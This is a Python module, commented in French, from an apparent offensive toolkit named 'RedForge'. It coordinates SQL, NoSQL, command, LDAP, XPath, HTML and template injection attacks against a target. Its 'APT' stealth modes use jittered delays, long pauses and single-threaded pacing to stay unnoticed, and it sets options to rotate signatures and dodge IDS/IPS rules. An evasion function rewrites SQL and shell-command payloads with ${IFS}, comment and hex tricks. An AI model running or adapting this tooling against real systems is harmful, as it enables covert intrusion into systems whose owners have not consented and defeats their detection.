#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module d'attaques par injection pour RedForge
Contient tous les types d'injections (SQL, NoSQL, Command, LDAP, etc.)
Version APT avec mode furtif et sélection avancée
"""

import time
import random
import json
from typing import List, Dict, Any, Optional
from dataclasses import dataclass, field
from enum import Enum

from src.attacks.injection.sql_injection import SQLInjection
from src.attacks.injection.nosql_injection import NoSQLInjection
from src.attacks.injection.command_injection import CommandInjection
from src.attacks.injection.ldap_injection import LDAPInjection
from src.attacks.injection.xpath_injection import XPathInjection
from src.attacks.injection.html_injection import HTMLInjection
from src.attacks.injection.template_injection import TemplateInjection


class InjectionAttackType(Enum):
    """Types d'attaques par injection disponibles"""
    SQL = "sql_injection"
    NOSQL = "nosql_injection"
    COMMAND = "command_injection"
    LDAP = "ldap_injection"
    XPATH = "xpath_injection"
    HTML = "html_injection"
    TEMPLATE = "template_injection"


class StealthLevel(Enum):
    """Niveaux de furtivité"""
    LOW = "low"          # Rapide, peu discret
    MEDIUM = "medium"    # Équilibré
    HIGH = "high"        # Très discret, lent
    APT = "apt"          # Ultra discret, style APT


@dataclass
class InjectionAPTConfig:
    """Configuration pour les opérations APT d'injection"""
    # Délais entre les attaques (secondes)
    delay_between_attacks: tuple = (30, 180)
    # Jitter pour les délais
    jitter: float = 0.3
    # Pauses aléatoires pendant les scans
    random_pauses: bool = True
    # Injection progressive (du moins au plus dangereux)
    progressive_injection: bool = True
    # Éviter les patterns de détection
    avoid_detection_patterns: bool = True
    # Rotation des signatures (évite les IDS/IPS)
    signature_rotation: bool = True
    # Logging discret
    stealth_logging: bool = True
    # Time-based injection pour blind SQL
    time_based_injection: bool = True
    # Délai maximum pour les time-based (secondes)
    max_time_delay: int = 10


class InjectionAttackManager:
    """
    Gestionnaire central des attaques par injection
    Supporte la sélection multiple, le mode furtif et les opérations APT
    """
    
    def __init__(self, target: str, stealth_level: StealthLevel = StealthLevel.LOW):
        """
        Initialise le gestionnaire d'attaques par injection
        
        Args:
            target: Cible (URL ou paramètre)
            stealth_level: Niveau de furtivité à utiliser
        """
        self.target = target
        self.stealth_level = stealth_level
        self.results = {}
        self.attack_logs = []
        
        # Initialiser les différents moteurs d'injection
        self.attacks = {
            InjectionAttackType.SQL: SQLInjection(),
            InjectionAttackType.NOSQL: NoSQLInjection(),
            InjectionAttackType.COMMAND: CommandInjection(),
            InjectionAttackType.LDAP: LDAPInjection(),
            InjectionAttackType.XPATH: XPathInjection(),
            InjectionAttackType.HTML: HTMLInjection(),
            InjectionAttackType.TEMPLATE: TemplateInjection()
        }
        
        # Configurer la furtivité
        self._setup_stealth()
        
        # Configuration APT par défaut
        self.apt_config = InjectionAPTConfig()
    
    def _setup_stealth(self):
        """Configure les paramètres de furtivité"""
        stealth_configs = {
            StealthLevel.LOW: {
                'delay_between_requests': (0.1, 0.3),
                'delay_between_attacks': (1, 5),
                'max_threads': 20,
                'random_delays': False,
                'stealth_headers': False,
                'payload_variations': 50,
                'depth': 'full'
            },
            StealthLevel.MEDIUM: {
                'delay_between_requests': (0.5, 1.5),
                'delay_between_attacks': (5, 15),
                'max_threads': 10,
                'random_delays': True,
                'stealth_headers': True,
                'payload_variations': 30,
                'depth': 'standard'
            },
            StealthLevel.HIGH: {
                'delay_between_requests': (2, 5),
                'delay_between_attacks': (15, 45),
                'max_threads': 3,
                'random_delays': True,
                'stealth_headers': True,
                'payload_variations': 20,
                'depth': 'light'
            },
            StealthLevel.APT: {
                'delay_between_requests': (5, 15),
                'delay_between_attacks': (30, 180),
                'max_threads': 1,
                'random_delays': True,
                'stealth_headers': True,
                'payload_variations': 10,
                'depth': 'stealth'
            }
        }
        
        self.stealth_config = stealth_configs[self.stealth_level]
        self._log_stealth_setup()
    
    def _log_stealth_setup(self):
        """Enregistre la configuration de furtivité"""
        log_entry = {
            'timestamp': time.time(),
            'event': 'stealth_setup',
            'level': self.stealth_level.value,
            'config': self.stealth_config
        }
        self.attack_logs.append(log_entry)
        
        if not self.apt_config.stealth_logging:
            return
            
        print(f"\n🕵️ Mode furtif injection: {self.stealth_level.value.upper()}")
        print(f"   - Délai entre requêtes: {self.stealth_config['delay_between_requests']}s")
        print(f"   - Délai entre attaques: {self.stealth_config['delay_between_attacks']}s")
        print(f"   - Threads max: {self.stealth_config['max_threads']}")
        print(f"   - Variations payload: {self.stealth_config['payload_variations']}")
        print(f"   - Profondeur: {self.stealth_config['depth']}")
    
    def _apply_stealth_delay(self, delay_range: tuple):
        """Applique un délai furtif"""
        if not self.stealth_config['random_delays']:
            delay = delay_range[1]
        else:
            delay = random.uniform(delay_range[0], delay_range[1])
        
        # Ajouter du jitter pour le mode APT
        if self.stealth_level == StealthLevel.APT:
            jitter = delay * self.apt_config.jitter
            delay += random.uniform(-jitter, jitter)
        
        time.sleep(max(0, delay))
    
    def select_attacks(self, attack_types: List[InjectionAttackType]) -> List[InjectionAttackType]:
        """
        Sélectionne les attaques à exécuter
        
        Args:
            attack_types: Liste des types d'attaques à exécuter
            
        Returns:
            Liste des attaques sélectionnées
        """
        available = [at for at in attack_types if at in self.attacks]
        
        if not available:
            print("⚠️ Aucune attaque par injection valide sélectionnée")
            return []
        
        print(f"\n🎯 Injections sélectionnées: {len(available)}")
        for attack in available:
            print(f"   - {attack.value.replace('_', ' ').title()}")
        
        return available
    
    def run_selected(self, attack_types: List[InjectionAttackType], **kwargs) -> Dict[str, Any]:
        """
        Exécute les types d'attaques par injection sélectionnés
        
        Args:
            attack_types: Liste des attaques à exécuter
            **kwargs: Options de configuration
                - params: Paramètres à tester
                - level: Niveau d'agressivité (1-5)
                - data: Données POST
                - depth: Profondeur du scan
        """
        selected = self.select_attacks(attack_types)
        
        if not selected:
            return {'error': 'No attacks selected'}
        
        print(f"\n💉 ATTAQUES PAR INJECTION sur {self.target}")
        print(f"🎭 Mode: {self.stealth_level.value.upper()}")
        print("=" * 60)
        
        # Ajouter les paramètres furtifs
        kwargs['stealth_config'] = self.stealth_config
        kwargs['stealth_level'] = self.stealth_level.value
        kwargs['apt_mode'] = (self.stealth_level == StealthLevel.APT)
        kwargs['payload_variations'] = self.stealth_config['payload_variations']
        kwargs['time_based'] = self.apt_config.time_based_injection
        kwargs['max_time_delay'] = self.apt_config.max_time_delay
        
        # Exécuter les injections selon la stratégie
        if self.apt_config.progressive_injection and self.stealth_level == StealthLevel.APT:
            results = self._run_progressive_injection(selected, **kwargs)
        else:
            results = self._run_sequential_injection(selected, **kwargs)
        
        # Résumé
        self._print_summary()
        
        return results
    
    def _run_sequential_injection(self, selected: List[InjectionAttackType], **kwargs) -> Dict[str, Any]:
        """Exécute les injections séquentiellement"""
        results = {}
        
        for idx, attack_type in enumerate(selected):
            attack_name = attack_type.value.replace('_', ' ').title()
            print(f"\n🎯 [{idx+1}/{len(selected)}] Exécution: {attack_name}")
            
            # Pause APT avant l'attaque
            if idx > 0 and self.stealth_level == StealthLevel.APT:
                if self.apt_config.random_pauses:
                    inactivity = random.uniform(30, 120)
                    print(f"💤 Pause APT: {inactivity:.0f}s")
                    time.sleep(inactivity)
                else:
                    self._apply_stealth_delay(self.stealth_config['delay_between_attacks'])
            
            # Exécuter l'attaque
            attack_result = self._run_single_attack(attack_type, **kwargs)
            results[attack_type.value] = attack_result
            
            # Délai entre les attaques
            if idx < len(selected) - 1:
                self._apply_stealth_delay(self.stealth_config['delay_between_attacks'])
        
        self.results = results
        return results
    
    def _run_progressive_injection(self, selected: List[InjectionAttackType], **kwargs) -> Dict[str, Any]:
        """
        Exécute des injections progressives pour mode APT
        Commence par les injections passives, puis actives
        """
        results = {}
        
        # Classification des injections par agressivité
        passive_injections = [
            InjectionAttackType.HTML,
            InjectionAttackType.XPATH
        ]
        
        semi_active_injections = [
            InjectionAttackType.NOSQL,
            InjectionAttackType.LDAP,
            InjectionAttackType.TEMPLATE
        ]
        
        active_injections = [
            InjectionAttackType.SQL,
            InjectionAttackType.COMMAND
        ]
        
        layers = [
            ("Passive", passive_injections),
            ("Semi-active", semi_active_injections),
            ("Active", active_injections)
        ]
        
        for layer_name, layer_injections in layers:
            applicable = [at for at in layer_injections if at in selected]
            if not applicable:
                continue
            
            print(f"\n📊 Couche {layer_name}:")
            
            for attack_type in applicable:
                attack_name = attack_type.value.replace('_', ' ').title()
                print(f"   → Test: {attack_name}")
                
                # Pause entre les injections de la couche
                if self.apt_config.random_pauses:
                    time.sleep(random.uniform(10, 30))
                
                result = self._run_single_attack(attack_type, **kwargs)
                results[attack_type.value] = result
                
                # Si vulnérabilité critique trouvée, passer à la couche suivante
                if result.get('critical_found', False):
                    print(f"   ⚠️ Vulnérabilité critique trouvée, passage couche suivante")
                    break
            
            # Pause entre les couches
            if self.apt_config.random_pauses:
                pause = random.uniform(60, 180)
                print(f"💤 Pause entre couches: {pause:.0f}s")
                time.sleep(pause)
        
        self.results = results
        return results
    
    def _run_single_attack(self, attack_type: InjectionAttackType, **kwargs) -> Dict[str, Any]:
        """Exécute une attaque unique avec les paramètres de furtivité"""
        attack = self.attacks[attack_type]
        
        # Ajuster les paramètres selon le niveau de furtivité
        scan_kwargs = kwargs.copy()
        scan_kwargs['level'] = self._get_attack_level()
        scan_kwargs['depth'] = self.stealth_config['depth']
        scan_kwargs['max_payloads'] = self.stealth_config['payload_variations']
        
        start_time = time.time()
        
        try:
            result = attack.scan(self.target, **scan_kwargs)
            duration = time.time() - start_time
            
            # Logging discret
            if self.apt_config.stealth_logging:
                vuln_count = len(result.get('vulnerabilities', [])) if isinstance(result, dict) else 0
                if vuln_count > 0:
                    print(f"   ✓ {vuln_count} vulnérabilité(s) trouvée(s) en {duration:.1f}s")
                else:
                    print(f"   ✓ Scan terminé en {duration:.1f}s")
            
            result['duration'] = duration
            result['stealth_level'] = self.stealth_level.value
            
            # Ajouter au journal
            self.attack_logs.append({
                'timestamp': start_time,
                'attack_type': attack_type.value,
                'duration': duration,
                'vulnerabilities_found': len(result.get('vulnerabilities', [])) if isinstance(result, dict) else 0
            })
            
            return result
            
        except Exception as e:
            print(f"   ✗ Erreur: {str(e)}")
            return {'error': str(e), 'vulnerabilities': []}
    
    def _get_attack_level(self) -> int:
        """Retourne le niveau d'agressivité basé sur la furtivité"""
        level_map = {
            StealthLevel.LOW: 5,
            StealthLevel.MEDIUM: 3,
            StealthLevel.HIGH: 2,
            StealthLevel.APT: 1
        }
        return level_map.get(self.stealth_level, 3)
    
    def run_all(self, **kwargs) -> Dict[str, Any]:
        """
        Exécute tous les types d'attaques par injection
        
        Args:
            **kwargs: Options de configuration
        """
        all_attacks = list(InjectionAttackType)
        return self.run_selected(all_attacks, **kwargs)
    
    def run_apt_operation(self, **kwargs) -> Dict[str, Any]:
        """
        Exécute une opération complète style APT pour les injections
        """
        print("\n🎭 DÉBUT DE L'OPÉRATION APT - INJECTIONS")
        print("=" * 60)
        
        # Configuration APT
        original_stealth = self.stealth_level
        self.stealth_level = StealthLevel.APT
        self._setup_stealth()
        
        # Stratégie d'injection APT typique
        apt_injection_order = [
            InjectionAttackType.HTML,        # D'abord passif
            InjectionAttackType.XPATH,       # Détection de structure
            InjectionAttackType.NOSQL,       # Tests NoSQL
            InjectionAttackType.LDAP,        # LDAP injection
            InjectionAttackType.TEMPLATE,    # SSTI
            InjectionAttackType.SQL,         # SQL injection
            InjectionAttackType.COMMAND      # Command injection (plus dangereux)
        ]
        
        # Journal APT
        apt_log = {
            'operation_start': time.time(),
            'target': self.target,
            'stealth_level': 'APT',
            'attack_order': [at.value for at in apt_injection_order]
        }
        
        # Exécuter les injections
        results = self.run_selected(apt_injection_order, **kwargs)
        
        # Ajouter les métadonnées APT
        total_vulns = 0
        for r in results.values():
            if isinstance(r, dict):
                total_vulns += len(r.get('vulnerabilities', []))
        
        results['apt_metadata'] = {
            'operation_duration': time.time() - apt_log['operation_start'],
            'total_attacks': len(apt_injection_order),
            'total_vulnerabilities': total_vulns,
            'stealth_level': 'APT',
            'progressive_injection': self.apt_config.progressive_injection,
            'time_based_injection': self.apt_config.time_based_injection
        }
        
        # Restaurer le niveau de furtivité original
        self.stealth_level = original_stealth
        self._setup_stealth()
        
        print("\n🎭 OPÉRATION APT - INJECTIONS TERMINÉE")
        self._print_apt_summary(results['apt_metadata'])
        
        return results
    
    def _print_summary(self):
        """Affiche un résumé des vulnérabilités trouvées"""
        print("\n" + "=" * 60)
        print("📊 RÉSUMÉ DES INJECTIONS DÉTECTÉES")
        print("=" * 60)
        
        total_vulnerabilities = []
        critical_count = 0
        high_count = 0
        medium_count = 0
        low_count = 0
        
        for attack_type, result in self.results.items():
            if not result or not isinstance(result, dict):
                continue
            
            vulnerabilities = result.get('vulnerabilities', [])
            if not vulnerabilities:
                continue
            
            for vuln in vulnerabilities:
                severity = vuln.get('severity', 'MEDIUM')
                if severity == 'CRITICAL':
                    critical_count += 1
                elif severity == 'HIGH':
                    high_count += 1
                elif severity == 'MEDIUM':
                    medium_count += 1
                else:
                    low_count += 1
                
                total_vulnerabilities.append({
                    'type': attack_type.replace('_', ' ').upper(),
                    'parameter': vuln.get('parameter', 'unknown'),
                    'details': vuln.get('details', vuln.get('evidence', '')),
                    'severity': severity
                })
        
        if total_vulnerabilities:
            print(f"\n⚠️  {len(total_vulnerabilities)} vulnérabilité(s) par injection détectée(s):")
            print(f"   🔴 CRITICAL: {critical_count}")
            print(f"   🟠 HIGH: {high_count}")
            print(f"   🟡 MEDIUM: {medium_count}")
            print(f"   🔵 LOW: {low_count}")
            
            print("\nDétails:")
            for vuln in total_vulnerabilities[:15]:
                icon = "🔴" if vuln['severity'] == "CRITICAL" else "🟠" if vuln['severity'] == "HIGH" else "🟡" if vuln['severity'] == "MEDIUM" else "🔵"
                param_info = f" ({vuln['parameter']})" if vuln['parameter'] != 'unknown' else ""
                print(f"   {icon} [{vuln['severity']}] {vuln['type']}{param_info}: {vuln['details'][:60]}")
            
            if len(total_vulnerabilities) > 15:
                print(f"   ... et {len(total_vulnerabilities) - 15} autres")
        else:
            print("\n✅ Aucune injection détectée")
    
    def _print_apt_summary(self, apt_metadata: Dict):
        """Affiche le résumé de l'opération APT"""
        print("\n" + "=" * 60)
        print("📊 RÉSUMÉ DE L'OPÉRATION APT - INJECTIONS")
        print("=" * 60)
        print(f"⏱️  Durée totale: {apt_metadata['operation_duration']:.1f}s")
        print(f"🎯 Attaques exécutées: {apt_metadata['total_attacks']}")
        print(f"✅ Vulnérabilités trouvées: {apt_metadata['total_vulnerabilities']}")
        print(f"🕵️ Niveau furtif: {apt_metadata['stealth_level']}")
        print(f"📊 Injection progressive: {apt_metadata['progressive_injection']}")
        print(f"⏰ Time-based injection: {apt_metadata['time_based_injection']}")
    
    def save_results(self, output_file: str, include_logs: bool = False):
        """
        Sauvegarde les résultats au format JSON
        
        Args:
            output_file: Fichier de sortie
            include_logs: Inclure les logs d'attaque
        """
        output_data = {
            'target': self.target,
            'timestamp': time.time(),
            'stealth_level': self.stealth_level.value,
            'results': self.results
        }
        
        if include_logs:
            output_data['attack_logs'] = self.attack_logs
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(output_data, f, indent=4, ensure_ascii=False)
        
        print(f"\n💾 Résultats sauvegardés dans {output_file}")
    
    def get_attack_report(self) -> Dict:
        """Génère un rapport détaillé des attaques"""
        total_vulns = 0
        for r in self.results.values():
            if isinstance(r, dict):
                total_vulns += len(r.get('vulnerabilities', []))
        
        return {
            'target': self.target,
            'stealth_level': self.stealth_level.value,
            'total_attacks': len(self.results),
            'total_vulnerabilities': total_vulns,
            'vulnerabilities_by_type': {
                at: len(r.get('vulnerabilities', [])) if isinstance(r, dict) else 0
                for at, r in self.results.items()
            },
            'attack_details': self.results,
            'logs': self.attack_logs
        }
    
    def generate_evasion_payloads(self, injection_type: str, base_payload: str) -> List[str]:
        """
        Génère des variantes de payloads pour éviter la détection
        
        Args:
            injection_type: Type d'injection (sql, nosql, command, etc.)
            base_payload: Payload de base à varier
        """
        evasion_payloads = []
        
        # Techniques d'évasion
        if injection_type == "sql":
            techniques = [
                lambda p: p.upper(),
                lambda p: p.lower(),
                lambda p: p.replace(" ", "/**/"),
                lambda p: p.replace(" ", "%0a"),
                lambda p: p.replace("'", "\\'"),
                lambda p: p.replace("=", "LIKE"),
                lambda p: f"/*!{p}*/",
                lambda p: p.encode().hex(),
            ]
        elif injection_type == "command":
            techniques = [
                lambda p: f"$({p})",
                lambda p: f"`{p}`",
                lambda p: p.replace(" ", "${IFS}"),
                lambda p: p.replace(" ", "%20"),
                lambda p: p.encode().hex(),
            ]
        else:
            techniques = [
                lambda p: p.upper(),
                lambda p: p.lower(),
                lambda p: p.encode().hex(),
            ]
        
        for technique in techniques:
            try:
                evasion_payloads.append(technique(base_payload))
            except:
                pass
        
        return list(set(evasion_payloads))


# Fonctions utilitaires pour l'utilisation du module
def create_apt_injection_session(target: str) -> InjectionAttackManager:
    """Crée une session APT pour les attaques par injection"""
    return InjectionAttackManager(target, stealth_level=StealthLevel.APT)


def quick_injection_assessment(target: str) -> InjectionAttackManager:
    """Évaluation rapide des injections (peu discret)"""
    return InjectionAttackManager(target, stealth_level=StealthLevel.LOW)


def stealth_injection_assessment(target: str) -> InjectionAttackManager:
    """Évaluation discrète des injections"""
    return InjectionAttackManager(target, stealth_level=StealthLevel.HIGH)


__all__ = [
    'InjectionAttackManager',
    'InjectionAttackType',
    'StealthLevel',
    'InjectionAPTConfig',
    'SQLInjection',
    'NoSQLInjection',
    'CommandInjection',
    'LDAPInjection',
    'XPathInjection',
    'HTMLInjection',
    'TemplateInjection',
    'create_apt_injection_session',
    'quick_injection_assessment',
    'stealth_injection_assessment'
]